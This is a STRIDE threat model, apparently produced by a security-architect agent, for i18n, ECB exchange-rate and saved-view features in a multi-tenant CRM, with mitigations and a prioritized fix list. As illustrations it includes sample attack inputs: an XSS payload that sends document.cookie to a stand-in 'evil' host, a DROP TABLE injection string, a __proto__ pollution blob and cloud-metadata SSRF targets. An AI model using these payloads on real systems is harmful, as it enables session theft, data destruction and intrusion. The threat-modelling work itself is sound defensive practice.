# Phase 0 — STRIDE Threat Model

> Generated 2026-05-17 by `security-architect` agent · review owner: Radu
> Scope: ROADMAP_V2.md §10 — i18n EN, Multi-currency (ECB daily), Saved Views
> Stack baseline (CLAUDE.md rule #3): JwtAuthGuard + RolesGuard + `TenantContextMiddleware` (ALS) → `runWithTenant()` on Prisma client with `tenantExtension()` → Postgres RLS via `SET LOCAL app.tenant_id` + `SET LOCAL ROLE app_user` → append-only audit log.

## Legend

- **Likelihood**: L (rare / requires insider or chained exploit), M (achievable by motivated tenant user), H (achievable by any authenticated user or unauthenticated)
- **Impact**: L (annoyance, single-tenant cosmetic), M (single-tenant data corruption or DoS), H (cross-tenant leak, money loss, takeover, regulatory breach)
- **Risk = Likelihood × Impact**, prioritized H×H first
- **Confidence markers** (per CLAUDE.md): `[verificat]` = checked with tool now, `[presupun]` = inference, `[propus]` = does not yet exist, must be built
- **Status of code**: `SavedView` model exists `[verificat: prisma/schema.prisma:2539-2554]`; `currency String @default("RON")` exists on ~14 models `[verificat]`; `ExchangeRate` model does NOT exist `[verificat]`; `apps/web/src/i18n/` does NOT exist `[verificat]`

---

## Feature 1 — i18n EN

### Trust boundaries

1. **FE bundle → browser**: `apps/web/src/i18n/{ro,en}.json` shipped as static assets, loaded lazily by language. Untrusted edge: a malicious CDN/MITM could swap files (mitigated by SRI + HTTPS); a malicious translator with PR access could inject hostile strings.
2. **HTTP `?lang=` / `Accept-Language` / cookie → BE**: user-controlled string used to pick template for emails + system notifications.
3. **Service Worker cache → browser**: PWA layer caches translation JSON across sessions; stale entries persist past logout.
4. **Email/notification renderer (BE) → SMTP / push provider**: BE assembles template + variables before send; variables include user-controlled fields (Deal name, Contact name).

### Assets

| Asset | Type | Location |
|---|---|---|
| `ro.json` / `en.json` catalogs | Static JSON in FE bundle | `apps/web/src/i18n/` `[propus]` |
| Email templates per locale | Handlebars/MJML files BE-side | `apps/api/src/modules/notifications/templates/{ro,en}/*` `[propus]` |
| User preferred locale | Postgres column | `User.preferredLocale` `[propus]` — does not exist today `[verificat]` |
| Service Worker cache key | Browser CacheStorage | `i18n-v<hash>` `[propus]` |

### Threats

| ID | STRIDE | Threat (concrete) | Asset | L | I | Mitigare |
|---|---|---|---|---|---|---|
| T-I18N-S-01 | Spoofing | A malicious npm dep ships a transitive translation file that gets bundled and impersonates a system notification ("Your password was changed — click here"). | FE bundle | L | H | SRI hashes on built JSON, `pnpm audit`, lockfile-only translation source (no runtime fetch from third-party CDN), translation review gate in `code-reviewer` agent before merge. |
| T-I18N-S-02 | Spoofing | RTL override char `U+202E` inside a translated string flips the visible direction of a sentence in the UI ("Confirm `[U+202E]`Delete order" renders as "Delete order Confirm"), tricking user into wrong action. | Notification templates, button labels | M | M | Strip / reject Unicode bidi-control chars (U+202A-U+202E, U+2066-U+2069) at catalog-load time in BE + FE; lint rule in `pnpm lint` rejecting these codepoints in JSON catalogs. |
| T-I18N-T-01 | Tampering | **Translation key injection**: FE code does `t(user.someField)` with user-controlled key, so a tenant user sets their profile name to `admin.dangerZone.deleteAllConfirmed` and that template renders in some UI context. | i18n runtime resolver | M | H | Architectural rule: keys MUST be literal string constants in code. Add ESLint rule `no-dynamic-i18n-key` rejecting `t(variableName)` patterns. Translator review checks no key contains placeholders that re-enter the lookup. |
| T-I18N-T-02 | Tampering | **ICU MessageFormat injection**: user-supplied variable interpolated raw into ICU template (`{userName, plural, ...}`); attacker sets name to `} other {<script>...</script>` and breaks out of the format. | Email template rendering | M | H | Use library that escapes user variables before ICU parse (e.g. `intl-messageformat` with strict mode); never `String.replace` placeholders manually; integration test that feeds `}` `{` `<` `>` into all variable slots and asserts HTML-encoded output. |
| T-I18N-T-03 | Tampering | Catalog file edited by a contributor adds `<script>` tag inside a translation, rendered via `dangerouslySetInnerHTML` in a Markdown-translated rich block. | FE rich-text components | M | H | Forbid `dangerouslySetInnerHTML` for i18n output; if rich formatting required, use a controlled component tree (e.g. `Trans` from `react-i18next` with explicit component map). CI grep `dangerouslySetInnerHTML.*t(` fails build. |
| T-I18N-R-01 | Repudiation | User changes locale, claims a notification was sent in a language they couldn't read, denying they ignored it. | Audit log | L | M | Emit `user.locale.changed { from, to, actorId, ipAddress, userAgent }` audit event; persist `localeAtSend` snapshot on every outbound notification row. |
| T-I18N-I-01 | Information disclosure | Missing-translation fallback leaks internal key path with PII context (`notification.deal.stolen_alert.body` reveals a feature exists). | Browser UI | M | L | Fallback to RO (default), never to raw key; missing-key telemetry emitted server-side only, not rendered. |
| T-I18N-I-02 | Information disclosure | **Service Worker cache poisoning** — after user logs out, SW still serves cached EN catalog with previous tenant's branding strings injected via white-label feature (Phase 1+); next user on same browser sees previous tenant's name. | SW CacheStorage | L | M | Cache key includes `tenantId` + build hash; on logout, FE calls `caches.delete('i18n-*')` for tenant-scoped catalogs; static catalogs (RO/EN system strings) remain cacheable. Cache-Control `private, max-age=...` on tenant-branded responses. |
| T-I18N-D-01 | Denial of service | Attacker sends `Accept-Language: en-US,en;q=0.9,fr;q=0.8,...` with 100 locales, BE loops to find best match, p99 spikes. | BE locale negotiation | M | L | Cap `Accept-Language` parsing at 10 entries; pre-built `Intl.LocaleMatcher` instance (cached); per-tenant throttler stays at default 100 req/min. |
| T-I18N-D-02 | Denial of service | Attacker hammers `/api/v1/i18n/translations/<locale>` (if such endpoint exists for OTA updates) with random locale codes to bypass cache. | `[propus]` translation endpoint OR static asset | L | L | Decision: ship catalogs as static assets only (no runtime `/i18n/` endpoint in Phase 0); if needed later, normalize locale to whitelist `['ro','en']` before cache lookup, return 400 otherwise. |
| T-I18N-E-01 | Elevation of privilege | Admin sees a translated button "Delete tenant" that maps (via tampered catalog) to a different confirm action with elevated effect. | UI confirmation flows | L | H | Confirm dialogs MUST use both translated label + the i18n key as `data-testid`; destructive actions require typed confirmation (`type tenant name`) — language-independent. Covered by existing dangerous-action UX pattern `[presupun: need to verify it exists]`. |

### Controls to implement (i18n)

- [ ] ESLint rule `no-dynamic-i18n-key` (rejects `t(expr)` where `expr` is not a string literal).
- [ ] Catalog loader strips Unicode bidi controls `U+202A-U+202E, U+2066-U+2069`.
- [ ] `intl-messageformat` strict mode with escaped variables for emails.
- [ ] SW cache key includes build hash + (for branded blocks) tenantId; `caches.delete` on logout.
- [ ] Audit events: `user.locale.changed`, `notification.sent { locale }`.
- [ ] CI grep fails on `dangerouslySetInnerHTML.*\bt\(`.

---

## Feature 2 — Multi-currency (ECB daily rates)

### Trust boundaries

1. **ECB endpoint → BullMQ worker**: HTTPS GET to `https://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml` (public, unauthenticated). Untrusted: TLS-pinned cert change, DNS hijack, ECB itself compromised, our DNS resolver poisoned.
2. **BullMQ job → Postgres `exchange_rate`**: scheduled 06:00 Europe/Bucharest. Untrusted edge if the queue is reachable by tenant users (it shouldn't be — internal admin role only).
3. **User mutation `Deal.amount` / `Deal.currency` → BE**: per-request, per-tenant. `amountBase` recomputed.
4. **Reporting query (cross-currency aggregation) → BE**: SUM(amountBase) across deals in different currencies for dashboard.

### Assets

| Asset | Type | Location |
|---|---|---|
| `exchange_rate(from, to, rate, asOf, source)` | Postgres table `[propus]` | new migration |
| `Deal.amount`, `Deal.currency`, `Deal.amountBase` | Postgres column | `prisma/schema.prisma` — `currency` exists at `:618` `[verificat]`, `amountBase` does NOT `[verificat]` |
| BullMQ queue `fx-rates-daily` | Redis | `[propus]` |
| Audit events `fx.rate.fetched`, `fx.rate.applied` | `audit_logs` table | `[propus]` |

### Threats

| ID | STRIDE | Threat (concrete) | Asset | L | I | Mitigare |
|---|---|---|---|---|---|---|
| T-FX-S-01 | Spoofing | DNS hijack / BGP attack returns attacker-controlled XML claiming `1 EUR = 0.0001 RON`; ingestor accepts; every Deal recomputed → deals appear "free", invoices auto-generated for 0.05 RON, payment processing bypassed. | `exchange_rate` + downstream `Deal.amountBase` | L | H | (1) Sanity bounds per pair: reject rate outside `[prevRate × 0.85, prevRate × 1.15]` for daily; on bound violation, raise `fx.rate.rejected` alert and KEEP yesterday's rate. (2) Multiple sources cross-check (ECB + BNR fallback) — disagreement >2% halts the job. (3) Pin ECB TLS via Certificate Transparency / SubjectPublicKeyInfo fingerprint check in worker. (4) Manual `OWNER` approval required for rate moves >10% in a day. |
| T-FX-S-02 | Spoofing | Worker fetches over plain HTTP because someone copy-pasted URL without `https://`. | Outbound HTTP | L | H | Zod-validated config: `ECB_URL` schema `.startsWith('https://')`; runtime assertion in worker; lint rule `no-http-url-literal` in `apps/api/src/modules/exchange-rates/`. |
| T-FX-T-01 | Tampering | **Float precision attack**: amounts stored as `Float`/`Number` accumulate error; attacker submits 1000 deals at `0.005` rounding boundary, sum diverges from invoiced total. | `Deal.amount`, `amountBase` | M | M | Prisma `Decimal` type for all money columns; Risk register Phase 0 already lists this `[verificat: ROADMAP_V2.md:84]`. Use `decimal.js` server-side; never `parseFloat` on user input — Zod `z.string().regex(/^\d+(\.\d{1,4})?$/).transform(Decimal)`. |
| T-FX-T-02 | Tampering | User PATCHes `Deal.amountBase` directly via API, bypassing currency conversion, to inflate forecast reports in their favor (sales bonus fraud). | `Deal.amountBase` write path | M | M | `amountBase` is **server-computed only**: DTO whitelist excludes it (Zod `.strict()` on Deal update DTO); Prisma extension recomputes on every write of `amount` or `currency`; integration test asserts PATCH with `amountBase` in body returns 400. |
| T-FX-T-03 | Tampering | **TOCTOU on recompute**: User changes `Deal.currency` at 05:59:59; FX job runs 06:00:00 and overwrites yesterday's rate; recompute job for affected deals reads new rate; user thinks deal was converted at yesterday's rate (per UI shown), reports diverge from invoices issued seconds earlier. | `Deal.amountBase` recompute pipeline | M | M | Every `amountBase` write stores `(amount, currency, rate, asOf, computedAt)` snapshot in a sibling column or `deal_currency_snapshot` table; never overwrite historical `amountBase` of CLOSED deals; recompute job operates only on OPEN deals AND uses `asOf <= deal.updatedAt` guard. |
| T-FX-T-04 | Tampering | Race condition: two workers pick up the same `fx-rates-daily` job (BullMQ retry on transient failure), both insert `exchange_rate` rows for same `(from, to, asOf)` → duplicate; downstream `SELECT ... ORDER BY createdAt LIMIT 1` non-deterministic. | `exchange_rate` table | M | M | `@@unique([from, to, asOf, source])` in Prisma; job uses `upsert`; BullMQ job options: `jobId: 'fx-daily-${YYYYMMDD}'` (deterministic) → de-duped by Redis. |
| T-FX-R-01 | Repudiation | User claims "I never set the deal to USD"; without audit, billing dispute is unresolvable. | `audit_logs` | M | M | Emit `deal.currency.changed { from, to, oldAmount, newAmount, actorId, ipAddress }` and `deal.amount_base.recomputed { dealId, rate, asOf, source }`. Retention: 7y (billing). |
| T-FX-I-01 | Information disclosure | Tenant A's deals leaked into Tenant B's report because cross-currency aggregation query joins `exchange_rate` (global) and forgets `tenantId` filter on `deals`. | Reporting SQL | M | H | `exchange_rate` is **global**, no `tenantId` column — but EVERY join with `deals` MUST flow through `runWithTenant()` so `tenantExtension()` injects `tenantId` and RLS `SET LOCAL app.tenant_id` enforces. Add integration test that switches tenant context mid-query and asserts row counts. Reporting service is on the `runWithTenant`-required list per `docs/SCALING.md`. |
| T-FX-I-02 | Information disclosure | `GET /exchange-rates/history` returns full timeseries; attacker scrapes to infer competitor pricing pattern (when did this CRM customer change USD exposure). | `/exchange-rates/*` endpoints `[propus]` | L | L | Rates are public data (ECB); endpoint is rate-limited but not authz-restricted. No PII risk. Documented as accepted residual. |
| T-FX-D-01 | Denial of service | ECB endpoint slow / down; worker retries forever; queue piles up; subsequent jobs (e.g. invoice generation) starved. | BullMQ worker pool | M | M | Per-job: `timeout: 15_000ms`, `attempts: 3`, `backoff: { type: 'exponential', delay: 60_000 }`; circuit breaker (already wired per `docs/SCALING.md`) opens after 5 consecutive failures, falls back to "use yesterday's rate + alert OWNER". |
| T-FX-D-02 | Denial of service | Attacker (authenticated user) calls report endpoint that triggers on-demand recompute across 1M deals; CPU pegged. | Reporting service | L | M | Recompute is async-only (BullMQ background), never on request path; per-tenant throttler default 100 req/min already in stack `[verificat: CLAUDE.md mentions]`; report endpoint serves last cached `amountBase`, not live recompute. |
| T-FX-D-03 | Denial of service | **SSRF via misconfig**: someone makes ECB URL configurable per-tenant ("custom rate source") and points it at `http://169.254.169.254/latest/meta-data/` (AWS IMDS) or `http://localhost:5432`. | Worker outbound HTTP | L | H | Phase 0 hard-codes ECB URL; if Phase 1+ adds tenant-configurable sources, MUST: (a) deny RFC1918, loopback, link-local (169.254.0.0/16), IPv6 ULA/loopback in HTTP client; (b) DNS-resolve once and pin IP before HTTP request to avoid DNS rebinding; (c) whitelist scheme `https` only; (d) block AWS/GCP/Azure metadata IPs explicitly. |
| T-FX-E-01 | Elevation of privilege | Tenant user mutates `Deal.currency` from RON to JOD (Jordanian dinar — currency code missing from whitelist → falls through validation), triggers downstream code that doesn't handle 3-decimal currencies, breaks invoicing rounding to attacker's favor. | Deal DTO validation | L | M | Zod enum whitelist of allowed currency codes (ISO 4217 subset relevant to RO market: `['RON','EUR','USD','GBP']` for Phase 0); reject unknown with 400; `InvoiceCurrency` Prisma enum `[verificat: schema.prisma:1037]` constrains invoices already. |

### Controls to implement (FX)

- [ ] `ExchangeRate` Prisma model with `@@unique([from, to, asOf, source])`.
- [ ] `amountBase` is `Decimal`, server-computed only, DTO `.strict()` rejects client value.
- [ ] FX job: deterministic `jobId`, `timeout: 15s`, `attempts: 3`, exponential backoff, circuit breaker.
- [ ] Sanity bound rate change ≤15% daily, otherwise reject + alert.
- [ ] Audit events: `fx.rate.fetched`, `fx.rate.rejected`, `fx.rate.applied`, `deal.currency.changed`, `deal.amount_base.recomputed`.
- [ ] Zod enum for ISO 4217 whitelist (`RON|EUR|USD|GBP`).
- [ ] Reporting service calls run through `runWithTenant()` — integration test for cross-tenant isolation.

---

## Feature 3 — Saved Views

### Trust boundaries

1. **`POST /saved-views` body → BE**: contains `name`, `resource`, `filters` (JSON blob). All three user-controlled.
2. **`GET /saved-views?resource=...` → BE**: returns list of views for current user + tenant.
3. **`filters` blob → BE list endpoints** (e.g. `GET /deals?savedViewId=...` or FE expands it client-side): JSON re-applied to Prisma `where` filter — this is the **highest-risk surface**.
4. **`name` field → FE rendering**: shown in dropdown, list view title.

### Assets

| Asset | Type | Location |
|---|---|---|
| `SavedView` table | Postgres | `prisma/schema.prisma:2539-2554` `[verificat]` |
| `SavedView.filters` JSON blob | Postgres `Json` column | same |
| List endpoints (`/deals`, `/contacts`, etc.) | NestJS controllers | various |

### Threats

| ID | STRIDE | Threat (concrete) | Asset | L | I | Mitigare |
|---|---|---|---|---|---|---|
| T-SV-S-01 | Spoofing | User crafts `POST /saved-views` with `ownerId: '<another-user-uuid>'` in body, hoping mass-assignment binds it; the view then appears in victim's dropdown. | `SavedView.ownerId` | H | M | DTO `.strict()` excludes `ownerId`, `tenantId`, `id`, `createdAt`, `updatedAt`; service sets `ownerId = ctx.userId`, `tenantId = ctx.tenantId` from ALS (`runWithTenant`); integration test posting `ownerId` returns 400. |
| T-SV-T-01 | Tampering | **`filters` blob as SQL injection vector**: FE sends `{ "amount": { "gt": "1; DROP TABLE deals;--" } }`; backend forwards raw to Prisma. | `SavedView.filters` → Prisma `where` | M | H | `filters` re-parsed through a **strict allow-list Zod schema per resource** before Prisma; never `Prisma.$queryRawUnsafe` with blob content. Prisma itself parameterizes, but the allow-list prevents abuse of unintended fields (e.g. `password`, `mfaSecret`) and unintended operators (e.g. `not`, `mode: 'insensitive'` may not be desired). Define `SavedFilterSchema['deal']`, `['contact']`, etc. in `packages/shared`. |
| T-SV-T-02 | Tampering | **Prototype pollution via filters**: `filters` contains `{"__proto__": {"isAdmin": true}}`; if BE uses lodash `merge` or similar to combine with default filters, pollutes Object prototype. | Filter composition logic | M | H | (1) Reject keys `__proto__`, `prototype`, `constructor` at Zod parse; (2) use `Object.create(null)` or `structuredClone` for merging, never lodash `merge`/`defaultsDeep`; (3) Node 22 already has `--disable-proto=delete` available — enable in production start command. |
| T-SV-T-03 | Tampering | **Filter operator abuse**: user crafts filter `{ "passwordHash": { "startsWith": "$2b$10$a" } }` to enumerate password hashes one char at a time via response timing or row counts (blind enumeration via boolean side-channel). | `where` clause on Users table indirectly | L | H | Allow-list schema (T-SV-T-01) restricts queryable fields to a whitelist per resource (e.g. `deal.amount`, `deal.stage`, NOT `user.passwordHash`); BE rejects `filters` referencing relations that traverse to auth fields. |
| T-SV-R-01 | Repudiation | User creates a view that hides certain deals (e.g., compliance flags), uses it during audit walk-through, then deletes the view to hide that this view ever existed. | Audit log | M | M | Audit `savedview.created`, `savedview.updated`, `savedview.deleted` with full filter blob snapshot in metadata. Retention 1y (ops). |
| T-SV-I-01 | Information disclosure | **IDOR**: `GET /saved-views/:id` returns view without `tenantId` filter; attacker iterates IDs and reads other tenants' saved filter names (which often contain client names: "Glovo deals Q4"). | `/saved-views/:id` endpoint `[propus]` | M | H | All reads use `runWithTenant()`; controller uses `findUniqueOrThrow` via tenant-extended client (auto-injects `tenantId`); RLS `SET LOCAL app.tenant_id` catches any miss. **Plus** per-user scope: even within tenant, user sees only their own views — service filters `where: { ownerId: ctx.userId }`. Decision pending: tenant admins MAY want to see all users' views (managerial visibility) — Phase 0 says NO (private to owner); if later enabled, requires `MANAGER+` role gate. |
| T-SV-I-02 | Information disclosure | Tenant A user creates view referencing `tenantId: 'tenant-B'` in filter, hoping Prisma extension respects user-supplied `tenantId`. | Cross-tenant via filters | L | H | `tenantExtension()` MUST override any `tenantId` in user-supplied where — already fixed per recent commit `b90f8b1 fix(prisma): tenantExtension preserves explicit tenantId — restores RLS mismatch defense` `[verificat: git log]`; regression test required for saved views specifically. |
| T-SV-I-03 | Information disclosure | **Stored XSS in `name`**: user names view `<img src=x onerror=fetch('https://evil/?c='+document.cookie)>`; another user in same tenant opens the dropdown, React renders it... React escapes by default, but if any code does `dangerouslySetInnerHTML` or the view name is later embedded in an email digest ("New view 'X' was shared with you"), unescaped. | FE dropdown, email digests | M | H | (1) React default rendering escapes — OK for dropdown. (2) Email digest path: enforce HTML-encoding (Handlebars `{{name}}` not `{{{name}}}`). (3) BE: Zod `z.string().max(80).regex(/^[\p{L}\p{N}\s\-_./()]+$/u)` on `name` — rejects `<>"'&` outright. (4) CSP `default-src 'self'` blocks the `fetch('https://evil/')` exfil channel anyway (defense in depth). |
| T-SV-D-01 | Denial of service | User creates 10,000 saved views, dropdown render is slow / memory blows up; or `filters` blob is 5MB JSON. | `SavedView` rows + payload | M | L | (1) Per-user cap: max 50 saved views per `(owner, resource)` enforced in service; on 51st, 409 Conflict. (2) Body size limit: NestJS bodyparser cap to `100kb` for `/saved-views`; `filters` JSON max 16KB stringified, enforced in Zod. (3) Pagination on `GET /saved-views`. |
| T-SV-D-02 | Denial of service | Pathological `filters` produces a Prisma query with 200 OR clauses → table scan; combined with concurrent requests, exhausts DB connections. | Postgres planner | M | M | (1) Allow-list schema (T-SV-T-01) caps array lengths (`in: z.array(...).max(100)`), nesting depth, total operator count. (2) `pg_stat_statements` monitoring on slow queries from `/deals` etc. (3) Per-tenant throttler 100 req/min default. |
| T-SV-E-01 | Elevation of privilege | VIEWER role creates saved view that filters on `stage: 'WON'` then triggers a "bulk action" off the view that requires MANAGER role — privilege escalation if bulk-action endpoint trusts the view ID instead of re-checking permissions. | Bulk action endpoints (Phase 1+) | M | H | Saved views are **filter persistence only** — no implicit action grant. Every action endpoint re-runs `RolesGuard` per CLAUDE.md rule #3. Document in `docs/ACCESS_CONTROL_MATRIX.md`: "SavedView does not grant any operation on underlying resources." |

### Controls to implement (Saved Views)

- [ ] `SavedViewCreateDto` is Zod `.strict()`, only accepts `name`, `resource`, `filters`.
- [ ] Per-resource `SavedFilterSchema` in `packages/shared` — allow-list fields + operators.
- [ ] Reject `__proto__`, `prototype`, `constructor` keys in `filters`.
- [ ] Service sets `ownerId` and `tenantId` from `runWithTenant` ALS context, never from request body.
- [ ] Service filters reads by `ownerId = ctx.userId` (Phase 0 = private only).
- [ ] `name` regex `/^[\p{L}\p{N}\s\-_./()]+$/u`, max 80 chars.
- [ ] Body size cap 100KB, filters JSON cap 16KB.
- [ ] Per-(owner, resource) saved view cap = 50.
- [ ] Audit events: `savedview.created`, `savedview.updated`, `savedview.deleted` (with filter snapshot).
- [ ] Integration test: cross-tenant IDOR on `/saved-views/:id` returns 404.
- [ ] Integration test: regression for `tenantExtension` override of user-supplied `tenantId` in filters.

---

## Cross-feature residual risks

| ID | Threat | Why we accept it (Phase 0) |
|---|---|---|
| R-XF-01 | ECB outage for >24h means stale rates; reports drift. | Accepted: yesterday's rate is acceptable for SMB CRM; alert OWNER after 24h staleness. Mitigation tightened in Phase 2 (BNR fallback). |
| R-XF-02 | EN translation of a legal-ish notification ("contract signed") differs slightly in meaning from RO original. | Accepted with mitigation: legal-impacting strings (contracts, GDPR notices) reviewed by `compliance` agent before catalog merge; non-legal strings ship after `i18n-localization` review only. |
| R-XF-03 | Saved view filters do not survive schema migrations (renamed field breaks old views). | Accepted: on schema change, run a one-off Zod re-validation pass, mark broken views with `migrationRequired: true`, surface in FE as "this view needs to be rebuilt". |
| R-XF-04 | No tenant-level i18n override (custom terminology per tenant). | Accepted Phase 0; deferred to Phase 5 white-label work. |

---

## Concrete TODO for `backend-engineer` (ordered, pre-merge mandatory)

Highest risk first (H×H) → then H×M → then M×M. Each item references the threat ID above.

**Block-merge (H×H or chain to H×H):**

- [ ] **T-FX-T-02 + T-FX-T-04** — `ExchangeRate` model with `@@unique([from, to, asOf, source])`; `Deal.amountBase` as `Decimal`, server-computed, DTO `.strict()` rejects client-supplied value; deterministic BullMQ `jobId` for daily fetch.
- [ ] **T-FX-S-01** — Sanity bounds (≤15% daily rate move) in worker; on violation reject + raise `fx.rate.rejected` audit event + alert OWNER role.
- [ ] **T-SV-T-01 + T-SV-T-02 + T-SV-T-03** — Per-resource `SavedFilterSchema` allow-list in `packages/shared`; reject `__proto__`/`prototype`/`constructor`; whitelist queryable fields per resource (no `passwordHash`, no `mfaSecret`, no `apiToken`).
- [ ] **T-SV-I-01 + T-SV-I-02** — `runWithTenant()` wrapping every saved-view service method; integration tests for cross-tenant IDOR and for `tenantExtension` override on user-supplied `tenantId`.
- [ ] **T-SV-I-03** — Zod `name` regex + length cap; verify email digest path uses `{{name}}` not `{{{name}}}` in Handlebars/MJML.
- [ ] **T-I18N-T-01 + T-I18N-T-02** — ESLint rule `no-dynamic-i18n-key`; `intl-messageformat` strict mode with escaped variables.
- [ ] **T-I18N-T-03** — CI grep fails on `dangerouslySetInnerHTML.*\bt\(`.

**High priority (H×M or M×H):**

- [ ] **T-SV-S-01** — DTO `.strict()` for `SavedViewCreateDto`, service sets `ownerId`/`tenantId` from ALS.
- [ ] **T-FX-T-03** — `deal_currency_snapshot` (or sibling columns) for historical (amount, currency, rate, asOf, computedAt); recompute job touches only OPEN deals.
- [ ] **T-FX-D-01** — BullMQ job options: `timeout: 15_000`, `attempts: 3`, exponential backoff; circuit breaker open after 5 consecutive failures.
- [ ] **T-FX-D-03** — Hard-code ECB URL (no tenant config); Zod schema `.startsWith('https://')` on `ECB_URL` env.
- [ ] **T-FX-E-01** — ISO 4217 enum whitelist (`RON|EUR|USD|GBP`) in Zod for `currency` on Deal write paths.
- [ ] **T-SV-D-01** — Per-(owner, resource) saved-view cap 50; body size 100KB; filters 16KB.
- [ ] **T-I18N-S-02** — Strip bidi control codepoints in catalog loader.

**Medium priority (M×M):**

- [ ] **T-FX-T-01** — Migrate any remaining money columns to `Decimal` (currently `currency` is on ~14 models `[verificat]`; verify `amount` columns are `Decimal`).
- [ ] **T-FX-R-01 + T-SV-R-01 + T-I18N-R-01** — Audit events added to `apps/api/src/modules/audit/audit-events.ts`:
  - `fx.rate.fetched`, `fx.rate.rejected`, `fx.rate.applied`
  - `deal.currency.changed`, `deal.amount_base.recomputed`
  - `savedview.created`, `savedview.updated`, `savedview.deleted`
  - `user.locale.changed`, `notification.sent` (extend with `locale` field)
- [ ] **T-I18N-I-02** — SW cache key includes tenantId for branded blocks; `caches.delete` on logout.
- [ ] **T-SV-D-02** — Zod array length caps (`in: z.array(...).max(100)`), nesting depth limit, operator count limit.
- [ ] **T-I18N-D-01** — Cap `Accept-Language` parsing at 10 entries.

**Low priority (L×H, defer if Phase 0 capacity blocked):**

- [ ] **T-I18N-S-01** — SRI hashes on translation JSON in built bundle.
- [ ] **T-I18N-E-01** — Verify dangerous-action confirm dialogs use language-independent typed confirmation.
- [ ] **T-SV-E-01** — Document in `docs/ACCESS_CONTROL_MATRIX.md`: "SavedView grants no operation; all actions re-check RolesGuard."

---

## Handoff

- **`backend-engineer`**: this document is your input. Implement the TODO list top-down (H×H first). Every checkbox should map to either a code change or a test.
- **`security-red-team`**: after backend-engineer implements, run adversarial review against the threat IDs above — try to actually exploit each one and confirm the mitigation holds.
- **`qa-automation`**: e2e scaffolds in `test/i18n.e2e.spec.ts`, `test/multi-currency.e2e.spec.ts`, `test/saved-views.e2e.spec.ts` should include at least one test per H×H threat ID.
- **`security-blue-team`**: verify audit events flow to SIEM; verify RLS active on `saved_views` (new) and `exchange_rate` (new — although global, still wrap reporting joins in `runWithTenant`).

## STRIDE coverage scorecard

| Feature | S | T | R | I | D | E | Total |
|---|---|---|---|---|---|---|---|
| i18n EN | 2 | 3 | 1 | 2 | 2 | 1 | 11 |
| Multi-currency | 2 | 4 | 1 | 2 | 3 | 1 | 13 |
| Saved views | 1 | 3 | 1 | 3 | 2 | 1 | 11 |
| **Total** | **5** | **10** | **3** | **7** | **7** | **3** | **35** |

All six STRIDE categories addressed for each feature. No category empty.
